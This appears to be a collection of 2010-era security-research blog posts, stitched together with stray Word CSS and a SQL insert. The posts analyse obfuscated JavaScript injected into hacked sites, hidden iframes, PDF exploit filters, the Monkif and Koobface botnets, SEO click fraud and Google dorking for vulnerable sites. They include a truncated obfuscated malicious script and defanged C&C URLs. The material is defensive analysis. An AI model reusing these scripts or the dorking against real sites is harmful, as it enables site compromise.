mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->   Now we are a little closer to decoding this script. We have the final array and we then call one function with the array as an argument. First, add “alert(sYvxoe19wg)” to the array before calling the function to see if we get the final array() and copy it using Ctrl + C from the message box. Here is what it looks like: <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->   Now we have the final array. Copy and paste this to a text file as it will be required later. A closer analysis of these 3 functions tells us that all these functions are being used to decode strings like “eval”, “fromCharCode” and “String.fromCharCode”. Simple array substitution is used to decode these strings. I have added comments for all these functions in the image below:  <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1107304683 0 0 159 0;} @font-face 	{font-family:Calibri; 	panose-1:2 15 5 2 2 2 4 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:swiss; 	mso-font-pitch:variable; 	mso-font-signature:-1610611985 1073750139 0 0 159 0;} @font-face 	{font-family:\"Geeza Pro\"; 	mso-font-alt:\"Times New Roman\"; 	mso-font-charset:0; 	mso-generic-font-family:roman; 	mso-font-pitch:auto; 	mso-font-signature:0 0 0 0 0 0;}  /* Style Definitions */  p.MsoNormal, li.MsoNormal, div.MsoNormal 	{mso-style-unhide:no; 	mso-style-qformat:yes; 	mso-style-parent:\"\"; 	margin-top:0in; 	margin-right:0in; 	margin-bottom:10.0pt; 	margin-left:0in; 	line-height:115%; 	mso-pagination:widow-orphan; 	font-size:11.0pt; 	font-family:\"Calibri\",\"sans-serif\"; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoChpDefault 	{mso-style-type:export-only; 	mso-default-props:yes; 	mso-ascii-font-family:Calibri; 	mso-ascii-theme-font:minor-latin; 	mso-fareast-font-family:\"Times New Roman\"; 	mso-fareast-theme-font:minor-fareast; 	mso-hansi-font-family:Calibri; 	mso-hansi-theme-font:minor-latin; 	mso-bidi-font-family:\"Times New Roman\"; 	mso-bidi-theme-font:minor-bidi;} .MsoPapDefault 	{mso-style-type:export-only; 	margin-bottom:10.0pt; 	line-height:115%;} @page Section1 	{size:8.5in 11.0in; 	margin:1.0in 1.0in 1.0in 1.0in; 	mso-header-margin:.5in; 	mso-footer-margin:.5in; 	mso-paper-source:0;} div.Section1 	{page:Section1;} -->   We have almost completed decoding this script. The array is passed to a JavaScript function called “String.fromCharCode()”. Let’s see the output of this by using a simple alert message and the array(). Open a test html file and paste these lines along with the array variables which we saved earlier.    alert(String.fromCharCode(......array));    This code delivers yet another obfuscated script. Here is the screenshot of the message box,   <!--  /* Font Definitions */  @font-face 	{font-family:\"Cambria Math\"; 	panose-1:2 4 5 3 5 4 6 3 2 4; 	mso-font-charset:0; 	mso-generic-font-family:roman;

As for any big event, attackers and spammers are using Blackhat Search Engine Optimization (SEO) to lure users to their site.    I stumbled upon a rather elaborate scam involving tens of sites, and multiple redirections. And this time, the people getting scammed out of their money are not the user but websites paying for advertising. A US college website has been hacked. A Wodpress blog has been added in a separate folder (/gd).           Blog post inserted on hacked website      This blog contains thousands of posts about Mother\'s Days. The hackers have used all the usual SEO techniques: keyword stuffing, pages focused on 2-3 keywords, multiple cross-links with keywords as content, light pages (lot of text, no images, few Javascript and CSS code, etc.)                            Page with links to all posts      There is no link to this blog on the main website. But it shows up in searches for \"Mother\'s Day 2010.\" If you visit the URL of a post directly, the page contents are visible. But if you click on a search result from Google, you get redirected to a different site: trraf.com. This is the same behavior we saw for the fake antivirus pages. However, this one is much more complex. traff.com is used to redirect the user to another website: rosecrane.com.                            rosecrane.com \"search engine\"      This is where the scam really occurs. The links do not point directly to the shown website. Instead, each link redirect to a server on a different IP address. These servers then redirects the user to an advertising website, bidsystem.com, which finally redirects the user to the advertised site. From their website, \"BidSystem is a Cost-Per-Click (CPC) ad network\". For webmasters, this network is similar to Google Adwords: they get paid every time a user clicks on an ad on their website.    To hide the volume of traffic coming from the \"Search engine\" from BidSystem, several servers are used as intermediary: the ad network thinks users have clicked on ads on multiple different sites. The spammers are tricking the users into coming to their page, and clicking on advertisements disguised as search results. This scams the advertisers by sending them unqualified traffic, that is users that are not interested in their products but where tricked into clicking of fake links, while hiding their shady business from the add network.    The advertisers are paying a premium for bad traffic, giving away money to the scammer through their ad network. Note that also the ad network may be unaware of the scam, they too profit from it by taking a fee on each click.    This scam invloves just 2 clicks from the users, but a lot of intermediates. Here is the path the unwilling user is going through (showing the user clicks, and the transparent browser redirections)  google.com click => .edu/gd/ transparent => trraf.com transparent => rosecrane.com click => /go.php transparent => kc.mv.bidsystem.com transparent => advertised site    I have alerted the webmaster of the hacked college site.

This page lists few (old) vulnerabilities and the corresponding Google search to find vulnerable targets.    More recently, I was doing research on hacked Wordpress websites. The Wordpress version can be identified with this HTML code:  <meta name=\"generator\" content=\"WordPress X.X.X\" />    Google does not usually allow search for HTML source code, but only for text. However, when a page is not parsed correctly, HTML code gets indexed as regular searcheable content, which actually happens pretty often    Google can show you a list of Wordpress sites that run version 2.7.1:                   Google search results for Wordpress 2.7.1      Coupled with security feeds that include ready-to-use exploits such as SecurityFocus  this technique can let attackers find vulnerable sites within minutes of a vulnerability disclosure, before website owners have time to update their website. For example, all rcent versions of MediaWiki, except the last one, are proned to a Cross Site Request Forgery vulnerability. Most othe MediaWiki websites carry an image with the alternative text \"Powered by MediaWiki\". Using the Google search for this text, it is easy to gather a list of potentially vulnerable targets.    Find vulnerable code    Google Code Search is a powerful tool that allows advanced searches in the source code of open software. You can even use regular expressions for the searches.    This tool can be used to find different types of vulnerabilities such as:           	software that includes vulnerable versions of a library  	dangerous code patterns  	  		for example, misuse of sprintf can lead to format string vulnerabilities   		lack of buffer size checks (with the C functions gets, memcpy, etc.)  	  	      Find infected pages    But we can also use Google to find pages infected in the same fashion, or exploits running in the wild. This allows us to gather more information about the attack, to get a list of domains that serve malicious files and to create an efficient set of signatures or heuristics to protect customers.    For example, we recently found this obfuscated JavaScript maliciously injected into the home page of an Indian college website:                       <script>  var HL;if(HL!=\'H\' && HL != \'\'){HL=null};var Dr=\'\';  try {this.t=\"\";this.De=\"\";var vX=new Date();  var WQ;if(WQ!=\'S\' && WQ!=\'g\'){WQ=\'S\'};  var qG=\"\";var Io=\"\";var v=new String(\"repla\"+\"ce\");  var hu;if(hu!=\'\' && hu!=\'zr\'){hu=\'\'};var J=\'\';  var Y=RegExp;var Jq;if(Jq!=\'\' && Jq!=\'fp\'){Jq=\'\'};  this.r=\'\';var uk;if(uk!=\'\'){uk=\'n\'};  function D(x,U){var W=String(\"[ZFEt\".substr(0,1));  this.K=\"\";var u=new String(\"g\");var el=\"\";W+=U;  this.av=\'\';W+=String(\"E4q]\".substr(3));var II=new String();  this.QQ=\"\";var UB=\"\";var z=new Y(W, u);return x[v](z, new String());  var mq=new Date();};var nk=new Array();var hS;if(hS!=\'\' && hS!=\'Ll\'){hS=\'qq\'};  var Bh;if(Bh!=\'xQ\' && Bh!=\'QF\'){Bh=\'\'};this.GX=\'\';var Bl;  if(Bl!=\'\' && Bl!=\'RI\'){Bl=\'gz\'};var Qh;if(Qh!=\'\' && Qh!=\'gY\'){Qh=\'rS\'};  var I=window;var To=new Date();var k=D(\'856044815016\',\"16457\");var bk=\"\";  var E=D(\'cTrNeIaqtIeIEIlTeNmqeTnqtI\',\"TINq\");var AC;if(AC!=\'\' && AC!=\'LN\'){AC=null};  var xQp;if(xQp!=\'\' && xQp!=\'_z\'){xQp=null};var DK=\'\';var Dz=D(\'oLnLleofaede\',\"jLef\");  var cX;if(cX!=\'lX\' && cX!=\'mD\'){cX=\'\'};var ww=new Date();  var V=D(\'/BwBsZjB.BcBoZmZ/ZwZsBjZ.ZcZoBmB/ZiBbZiZbBoZ.ZcBoBmZ  /BgBoBoZgZlBeB.BcZoZmB/BxBvBiBdBeBoZsZ.BcBoZmB.ZpZhBpZ\',\"ZB\");  var h=D(\'sNcRrFiRp1t1\',\"HF1RN\");  var c=D(\'hWtZtZpW:y/W/ylYiynZkybGuZcWkysY-ycyoZmW.Z3Z7WwyaGnZ.ZcWoYmG.

The IFRAMES are either injected as plain text or they are heavily obfuscated using JavaScript. Obfuscation is intentionally used by attackers to bypass AV or IPS engines. Attackers are not only using simple obfuscation techniques to encode malicious IFRAMES, they are also using publicly available Base64 encoding/decoding routines to encode their content. Recently, we found one website which was infected with a malicious IFRAME leveraging such a technique. Here is the screenshot of the webpage:                 As can be seen, the JavaScript code after the tag looks suspicious. Strings such as CRYPT.decode, CRYPT.obfuscate and eval() tell us that this script is likely malicious. Let’s format the code JavaScript so that it’s easier to read. Here is the formatted code:          This is the initial part of the JavaScript, which is being used to encrypt the script using signature and key strings. The key string is a long string containing upper and lower case characters, numbers and special characters. Let’s look at the remainder of the script:          Here, we see a function called _utf8_decode() being used to decode the script and there is also a call to an eval() function. If we decode it using a tool called Malzilla, you will see the following hidden malicious IFRAME:          Interestingly, the code used for this encoding technique is publicly available on the Internet. In fact, this Base64 encoding/decoding routine is a part of the webtoolkit. The name of the JavaScript file in question is “webtoolkit.base64.js”. Here is the screenshot of webpage:          In this case, the attacker has used the same code to encode the malicious script with a few minor changes such as adding an eval() function to the script. This shows just how easy for an attacker to create obfuscated JavaScript using publicly available code. Though, the webtoolkit JavaScript is being written for a legitimate purpose, attackers are taking advantage of the freely available code. Detection of this technique remains poor among antivirus vendors. Only 17 vendors out of 41 are detecting this malicious script. The Virustotal results also show that’s many large vendors such as Symantec, Microsoft, Mcafee, etc. are still missing protection for this malicious script.

For example, the Avalanche botnet has a domain registration and fast-flux infrastructure that is frequently used for hosting Zeus, phishing, and money-mule recruitment sites.  Typically, Avalanche bulk registers domains that often do not have any correlation to any particular word or alias, for example:erasvjjkkyuuikomyy1azsvazah7kiozyuojli...The theory is that by conducting character based analysis on malicious and benign domains/URLs, indicators would emerge that if certain patterns were present or absent it would be a domain/URL worth investigating further.  Additionally, a character/sequence based score could be included into a page risk scoring algorithm.Using a technique called N-gram analysis, it is possibly to very quickly extract sequences of characters from text and calculate the frequency of occurrences with the text.In order to have an adequate sample size for this analysis, I built a list of 250,000 malicious URLs and 250,000 benign URLs over the past few months. I used the CPAN module Text::Ngrams within Perl scripts to calculate the frequency of sequence occurrences and compute the frequency differences between the malicious and benign domains.  I computed the top character sequences from 1 character (1-gram) to 6 characters (6-gram).  A draft of the report can be read HERE.Results Summary1-Gram:The \"-\" (dash character) was the most popular character within malicious versus benign domains.  \"h\", \"r\", and \"p\" were the top three letters that were much more prevalent within malicious domains than benign domains.  Other characters that are less popular within the English language were also much more prevalent within malicious domains: \"j\", \"z\", \"w\", \"y\", and \"q.\"2-Gram:\"te\", \"on\", and \"os\" were the top three two-character sequences that were much more prevalent within malicious domains than benign.  In addition, there were some notable TLD sequences that showed up much more frequently within malicious domains: \"ch\", \"nl\", \"fr\", and \"ru.\"3-Gram:The top three-character sequences within malicious versus benign domains were character sequences making up the words \"online\" and \"watch.\"  Some other character patterns that were much higher within malicious domains appeared to be related to QWERTY keyboard sequences, such as \"fds\", \"asd\", and \"dfd.\"  Also, as expected, some of the X-rated themed character sequences (\"xxx\", \"sex\") were more prevalent within malicious domains.4-Gram through 6-gram:Some of the top 4-character word results for malicious versus benign domains include: \"porn\", \"free\", \"host\", \"game\", \"scan\", \"anti\", \"evil\", and \"best.\"  5-character malicious versus benign sequences results include: \"watch\", \"forum\", \"gamer\", \"adult\", \"virus\", \"music\", \"video\", \"-sell-\", \"free-\", and \"phone.\"  6-character malicious versus benign sequence results include: \"online\", \"funpic\", \"video\", \"hostin(g)\", \"spywar(e)\", \"archiv(e)\", \"antivi(rus)\", \"system\", \"scanne(r)\", and \"securi(ty).\"  Many of these character sequences occur within FakeAV and Fake Codec malware sites.Future WorkIn the future, I\'d like to take a larger sample size (e.g., 1 Million malicious and 10 Million benign), and analyze the malicious domains/URLs by threat (e.g., Zeus, Koobface, various exploit kits, phishing sites, etc.) to compare against benign domains/URLs.

A search for “site:consultenet.com” yields 403 results. By looking at the URLs, it is easy to spot the bad pages. One of them is hxxp://consultenet.com/seriously/didi.html. If you access this page from Google using the same search terms, you get the harmless page which Google used to rank the content. The hacked page looks at the Referer header to check where the user is coming from. Not only does the user has to come from Google, but it also needs to have done a “normal” search.

I posted on this topic 3 weeks ago and argued that this may not be true. I wanted to additionally do a thorough investigation of the Twitter links both before the security scan and after.         I have retrieved more than 1 million URLs (1,314,615 to be exact) from the public timeline over a couple of weeks before they put any protections in place.

I looked for malicious sites - phishing sites, malware, etc. I did not look for spam, only for pages that present a security risk to users.

Same case for TinyUrl:  5% of all URLs and 6 % of all malicious sites. It does not look like bit.ly’s phishing and malware protection is making it any safer than other URL shorteners.  Twitpic.com is used to share images, so it is unlikely to be used for malicious content. Mediafire is known for hosting malware and other viruses, even if it is not blacklisted by Google Safe Browsing.         Note that these links may have been scanned up to 4 weeks after they were collected. Bad sites may already have been taken down, or cleaned up.        Can Twitter and bit.ly really protect their users?    The key to protecting end users, is real-time scanning of both the URL and the content. Twitter and bit.ly can only scan the links periodically.  Malicious websites try to hide their malicious content to non-users by checking the user agent or geography and by requiring a real browser which fully understands Javascript, Flash, etc.  An attacker can present harmless content to the Twitter or bit.ly scanners, but harmful content to a real user.    But remember that only 0.06% of all the URLs tests represented a security risk.

I added the total number of web transactions involving a TLD for the month and divided it by the total number of unique domains within that TLD.  In other words I calculated a ratio of Transactions:Unique Domains per TLD for each month and tracked this ratio.  A low ratio means that the transactions were well distributed across the domains visited within that TLD.  A ratio of 1:1 for example means that there was essentially 1 web transaction per unique domain visited.  A very high ratio would indicate that there were a large number of transactions to one or more of the unique domains visited - suggesting that one or more popular domains dominated customer usage of that particular TLD.By sifting through the records for the high-ratio results, some interesting information can be discovered.  In some cases, high-ratios were caused by numerous transactions to a popular site or service, such as a popular social networking site in a particular ccTLD.  However, high-ratios may also represent malicious command and control (C&C) or information drop servers that have a large number of transactions beaconing to them.An example of a TLD that bubbled to the top was .LY.  This domain had more than double the monthly ratio value of .COM.

Here are the servers associated with the Monkif activity:  hxxp://88.80.7.152    hxxp://www.clickspot.biz  hxxp://stats.hillmedia.biz  hxxp://cdn.cbtclick.biz  hxxp://88.80.5.3  hxxp://www.clickbig.biz  hxxp://stats.woodmedia.biz    Here is how random requests looks like,  hxxp://88.80.7.152/cgi/tjo.php?ddddd=4x4x4x4x4x70x  hxxp://88.80.7.152/cgi/dsiy.php?dsydm=5561671  hxxp://88.80.7.152/babymaybe/hwmcr.php?wmcrx=06166<1x644434x4x4x4x=x>  hxxp://88.80.7.152/babynot/blfp.php?dxrzz=77445=1x644413x640  hxxp://cdn.cbtclick.biz/babynot/ecccccc.php?cccc=4x4x640  hxxp://88.80.7.152/cgi/scrhxm.php?rhxm=4x4x4x4x4x70x  hxxp://88.80.7.152/cgi/nd.php?iy=4x4x4x4x4x70x  hxxp://88.80.7.152/cgi/ffffffff.php?fff=4x4x4x4x4x70x  hxxp://88.80.7.152/cgi/raqfv.php?aqf=4x4x4x4x4x70x  hxxp://stats.hillmedia.biz/cgi/wl.php?rgmra==<44=46x644547x640>      As the above requests show, every request is unique, containing random data. This is done to fool IDS/IPS engines from detecting the malicious requests. The C&C server replies with Content-Type “image/jpeg” which contains JPEG image with malicious commands hidden inside. The malicious image file contains the JPEG header followed by some commands that are in encoded format. We observed by downloading some image files that first part of the command remains same and later part changes values. Here are some examples:           lppt>++<<*<4*3*516+`+`h*tlt;bh9g<4f=g=fb==1f5aefg6364a1<64fa4fe\"bm`9544\"5911266139|200118|2048|0|0|66    lppt>++<<*<4*3*516+`+`h*tlt;bh96efe<6600g6fbb`5<14253a4ea5=6`03\"bm`9544\"593300195|200057|2048|0|0|2    lppt>++<<*<4*3*516+`+`h*tlt;bh9ag=3g7a31<6<<17`7b2`b53f1`52=ff7\"bm`9544\"591955928|200044|2048|0|0|18            The bold text remains same in the JPEG image file and later part differs for every request – this makes detection difficult. The values within the JPEG are the malicious commands that instruct the Monkif to infect victim systems. If you compare other Botnet traffic like Koobface verses Monkif in Q1 2010, you will find that Monkif is very consistent and ongoing.    The unique network traffic for Trojan Monkif remains approximately same for each month in this quarter (March data is up to 17th). The detection for these JPEG file is zero (here is the Virustotal result for one of the C&C image files). This means you are at a greater risk from this Botnet if you are relying on only a single security protection like Antivirus.    We are near to end of Q1, 2010 and Botnet attacks remain a large threat on the web. Previously, we saw Koobface activity rise and fall, but this Monkif threat remains consistently active. The attackers behind Trojan Monkif are evading the detection by hiding their malicious Botnet commands inside JPEG files. The commands inside the JPEG files are encoded and vary, making detection more difficult for Antivirus vendors. The Virustotal result shows none of the Antivirus vendors out of 42 are detecting these malicious samples. The web is growing and so are Botnets. Currently, we are seeing only a few C&C servers being used for this Trojan, but this may increase in the future. Koobface and Monkif have been active threats in the Q1 2010, but Monkif has remained consistent. Zscaler’s solution is detecting these kinds of attacks every day. Be sure to block the above-mentioned malicious domains, and check that your security solutions are protecting you from these dangerous threats.    Be Safe!!!

Koobface is a computer worm, which was first found in December 2008 and is still spreading heavily. The Koobface worm targets popular social networking sites such as Facebook, MySpace, Twitter, etc. Once infected, the worm downloads additional malware on the user machine. It spread via sending messages to the friend list of the infected user. We have seen a lot of Koobface activity in the past where numbers of new domains are used to download malicious binaries. Yesterday, we saw an increase in network traffic of the Koobface worm to 122 unique C&C servers.\r\n\r\n\r\n \r\nWeekends are busy social networking days for users, and the Koobface worm presumably took advantage of this. The simple scenario is described below,\r\n\r\nThe worm spreads via social engineering attack. User visits the infected friend’s profile and then clicks on the link. Then the link shows the video being displayed but shows error message like “your flash player is out of date” and you have to download new update. The innocent user clicks on the download link thinking that it is real update for flash player and ends up getting the worm on their system. We saw increase in unique C&C servers from last few days and sudden increase on Sunday.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (545, 'Are URL Shorteners Really Dangerous?', 'Julien Sobrier', 'March 09, 2010', 'There has been plenty of buzz about URL shorteners and security. URL shorteners have been described as a new attack vector since being popularized by social networks such as Twitter. I don\'t feel that URL shorteners are any more of a threat than their full length counterparts and here\'s why...    How URL shorteners work      The purpose of a URL shortener is to replace a log URL (e.g: http://www.zscaler.com/downloadwhitepaper_stateofweb-q4-2009.html) with a shorter one (e.g: http://bit.ly/cikl0z). When a user clicks on http://bit.ly/cikl0z, he is redirected to http://www.zscaler.com/downloadwhitepaper_stateofweb-q4-2009.html via an HTTP 301 redirection:     GET /cikl0z HTTP/1.1  Host: bit.ly    HTTP/1.1 301 Moved  Location: http://www.zscaler.com/downloadwhitepaper_stateofweb-q4-2009.html  ----------------------------------------------------------  GET /downloadwhitepaper_stateofweb-q4-2009.html HTTP/1.1  Host: www.zscaler.com    HTTP/1.1 200 OK  The browser made two requests: one to  http://bit.ly/cikl0 and one to http://www.zscaler.com/downloadwhitepaper_stateofweb-q4-2009.html      Existing defense mechanisms    All the existing in-browser (Google Safe Browsing in Firefox, Opera\'s Fraud Protection, etc.) or external (IDS, proxy, etc.) URL scanners are applied on both the initial short and redirected long URL requests. If the long URL is a known malicious site, it will be stopped whether or not the the user clicks directly on the long URL, or on a shortened URL.         Firefox Safe Google Browsing warning on a URL after a redirection    Also, content inspection (Antivirus, Deep Packet inspection, etc.) is applied on both requests.    The use of URL shorteners and redirections does not require any new security inspection. All of the web browser security tools in place prior to the use of URL shorteners are still relevant.      Hiding the real URL    The main argument against URL shortening services is that users don\'t know which domain they are being redirected to. In our previous example, users see the bit.ly host name in the link address, and do not know that they will be redirected to www.zscaler.com until after they click on the link. After the redirection, the ultimate destination URL can be seen in the web browser address bar.           The long URL is displayed in the browser address bar after redirection    How many people know the difference between a good URL and a bad URL? Even then, how can anyone be sure that a site won\'t serve malicious content. Many perfectly legitimate websites (Redcross, Indian Governmental websites, etc.) have been hacked and can contain an infamous hidden iframe to spread malware. Well-known websites are no longer necessarily safer than unknown or new sites. Simply using the reputation of the hostname for deciding whether a URL is safe or not is not a good idea.      In a post Michael wrote a year ago, he checked 100,000 TinyURL (URL shortener service) urls. He did not find any link to a malicious executable, no phishing sites, and really few redirections to malicious content.    I believe the danger of URL shorteners has been overblown, mainly based on the idea that individuals are in a position to determine if a website is dangerous or not simply by looking at the final URL.

The idea employed by attacker’s leverages different filtering techniques to hide malicious data so that it will be difficult to understand and decode. We have encountered many PDF exploits where either “[/FlateDecode /ASCIIHexDecode]” or “[/FlateDecode /ASCII85Decode]” filters are used. As defined by gnupdf, “the ASCIIHexDecode filter decodes data that has been encoded in ASCII hexadecimal form” and “the ASCII85Decode filter decodes data that has been encoded in ASCII base-85 encoding and produces binary data”. Interestingly, we have found another case, which Zscaler blocks, whereby both of the filters are used in the same PDF on different objects. This technique can be used to hide malicious code inside the PDF.\r\n\r\nThe following sample is still live on the web. Let’s open it in notepad and search for the “ASCIIHexDecode” or “ASCII85Decode” filters to see if they are used. Here is the screenshot where the “ASCIIHexDecode” filter is used:\r\n\r\nIf you look at the above image, there is something suspicious, a non-readable block of code in the 18 object with a length of 19343. The PDF is not blank and contains 4 pages text. The malicious code is injected toward the bottom of the PDF to avoid detection. Let’s decode it to see if it contains malicious JavaScript. The tool “pdf-parser.py” from PDF Tools supports both of the filters and easily decodes the code inside.\r\n\r\n The decoded script is now shown above. The above malicious script is using special characters like @, _, ?, !, $, etc for substitution in one of the variables. If we remove these characters from the variable, you will see clear text malicious JavaScript code inside. Looking at the above JavaScript code, it does not contain any functionality to replace or remove these characters. Without such functionality, the code would be incomplete. We therefore need to look for additional functionality elsewhere in the PDF file. We later found another filter called “ASCII85Decode”, which included some additional suspicious code. Here it is:\r\n\r\n Let’s decode this further using “pdf-parser.py” tool. The below command is used to decode this particular object.\r\nD:\\pdf-parser.py --object=20 --raw --filter withSearch.pdf > out2.log\r\nHere is the decoded script for this filter,\r\n\r\n That’s it. It does indeed contain additional malicious JavaScript. This is an interesting case where the script is divided into two parts, encoded using different filters and used in two different objects. This is done intentionally by the attacker to fool Antivirus engines and avoid detection. Let’s decode this script to see which PDF vulnerabilities it targets.\r\n\r\nThe above malicious JavaScript targets 3 old vulnerabilities,\r\n\r\n	collectEmailInfo() – CVE-2007-5659\r\n	Collab.getIcon() – CVE-2009-0927\r\n	.printf() – CVE-2008-2992\r\n\r\nThe above example showed that attackers are using different techniques to avoid Antivirus detection using different filtering mechanisms. Also, attackers are now splitting the scripts into parts, encoding them with different filtering techniques and putting them into different objects. Using this approach increases the complexity of decoding/detection. There are number of live PDF exploits on the web using these filtering techniques. Detection rates for the above example are very low. Only 13 antivirus vendors out of 42 detect this sample. The Virustotal results show that a number of popular Antivirus vendors are still missing the detection. This also shows that you can’t rely on a single protection mechanism like installing only an antivirus engine on your system. A combination of antivirus, IDS/IPS, URL filtering/categorization, etc is necessary in order to provide a defense-in-depth approach to security. We have seen an increase in client-side attacks like this as opposed to traditional server-side attacks. Attackers are not only targeting popular applications like PDF, Flash, etc., but they are also using a variety of techniques to deliver their malicious code as well.\r\n\r\nThat’s it for now.

A large number of legitimate web sites have been victim of attacks, where the payload modifies the pages on the website to include hidden Iframes to malicious content. This content is processed by the browser, transparent to the user, and can compromise the user’s system if they are running vulnerable client applications (for example, the browser itself, browser plug-ins, Adobe Acrobat reader, and Flash player).    Malicious Iframe attacks are not new but remain heavily used to carry out different attacks. HTML Iframe tags are used to embed content into the web page from a particular source, including sources external from the actual web site. Attackers are using zero pixel Iframes embed malicious content while to keeping content hidden from the user. People are often become victims from such attacks as it is easy to inject such malicious Iframes into a legitimate webpage by taking advantage of web application vulnerabilities like SQL injection.    Let’s walk through live example where a malicious Iframe has been injected in the webpage. Here is the screenshot of one of the website injected by Iframe,                         The above screenshot shows obfuscated JavaScript is present in the webpage after the closing html “” tag (prior to the actual page body). Malzilla a user friendly GUI tool was used to decode the obfuscated JavaScript. You can find good documentation on their website.                       Interestingly, the JavaScript decodes into another obfuscated JavaScript. There is small function called dF() and a call to the “document.write()” function. Below is a screenshot of decoding this further:                              After decoding a second time, the JavaScript is clear and readable. This hidden injected Iframe embeds this JavaScript within the page, and when someone visits the page the JavaScript is processed by the browser, transparent to the user. If you look at the height and width of the Iframe, it is set to 1 pixel, which will not be seen by the user.         The above live example used multiple obfuscation techniques to hide the functionality of the malicious JavaScript. We have seen a number of websites infected with the same JavaScript code. The above example used “document.write()” function to write the malicious script into the page. Below is a decoded single obfuscated JavaScript example, which is still present on many websites:             Attackers are using simple to complex obfuscation techniques to encode their malicious script. Due to this, many Antivirus engines are unable to detect new injected Iframes. Here are the Virustotal results for the first example showing very low detection. Here is the third example of injected obfuscated script:                    There are some important points to be considered here.           	In the past, it was common for attackers to inject their malicious Iframes at the bottom / end of the webpage. Attackers are now injecting malicious Iframes anywhere in the webpage.  	Many websites which were found to be infected in past months by malicious hidden Iframes appear to still be infected with them. Meaning most web site owners or hosting providers are not policing the content that they are serving on the web.                Our data shows many previously infected websites are still infected with hidden malicious Iframes today. Due to different obfuscation techniques detection by Antivirus vendors remains poor. This shows that even if it is a well-known attack, people are still at risk of being compromised. Web site owners and hosting providers should regularly patch any 3rd party web applications used to avoid known vulnerabilities (such as SQL injection), and regularly inspect their web pages for unauthorized modification (to include these malicious Iframes). Look out for obfuscated JavaScript within webpage’s, and for additions made prior to or following the HTML body tags. Users should patch all client applications (browsers, browser plug-ins, Adobe Acrobat, Flash, Java, Microsoft Office, etc.) used to view content pulled from the web. Additionally users can inspect the source of webpage and report compromised sites to the web site owner or hosting provider.    Start acting now. Be Safe while surfing!

